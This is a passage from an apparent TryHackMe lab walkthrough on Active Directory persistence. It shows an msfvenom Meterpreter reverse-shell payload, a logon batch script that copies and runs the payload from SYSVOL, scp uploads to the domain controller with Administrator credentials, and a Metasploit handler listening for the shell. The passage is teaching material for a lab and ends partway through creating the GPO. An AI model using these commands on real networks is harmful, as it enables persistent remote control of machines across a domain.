Preparation

Before we can create the GPO. 
We first need to create our shell, listener, and the actual bat file that will execute our shell. 

Let's start by generating a basic executable shell that we can use:
    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe


Make sure to add your username to the binary name to avoid overwriting the shells of other users. 
Windows allows us to execute Batch or PowerShell scripts through the logon GPO. 
Batch scripts are often more stable than PowerShell scripts so lets create one that will copy our executable to the host and execute it once a user authenticates. 

Create the following script called <username>_script.bat on the AttackBox:
    copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\<username>_shell.exe C:\tmp\<username>_shell.exe && timeout /t 20 && C:\tmp\<username>_shell.exe

You will see that the script executes three commands chained together with &&. 
The script will copy the binary from the SYSVOL directory to the local machine, then wait 20 seconds, before finally executing the binary.

We can use SCP and our Administrator credentials to copy both scripts to the SYSVOL directory:
Terminal Kali Script 
    scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
    scp am0_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/


Finally, let's start our MSF listener:
    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit"

With our prep now complete, we can finally create the GPO that will execute it. You will need to RDP into THMWRK1 and use a runas window running as the Administrator for the next steps.

GPO Creation

The first step uses our Domain Admin account to open the Group Policy Management snap-in:

In your runas-spawned terminal, type MMC and press enter.
Click on File->Add/Remove Snap-in...
Select the Group Policy Management snap-in and click Add
Click OK
